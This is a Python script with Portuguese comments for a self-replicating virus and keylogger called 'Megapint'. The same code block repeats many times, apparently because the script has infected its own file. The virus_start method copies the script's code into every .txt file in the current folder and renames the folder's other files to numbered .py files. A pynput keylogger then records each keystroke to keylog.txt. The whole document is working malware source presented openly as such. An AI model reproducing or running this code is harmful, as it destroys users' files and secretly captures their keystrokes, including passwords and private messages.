    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

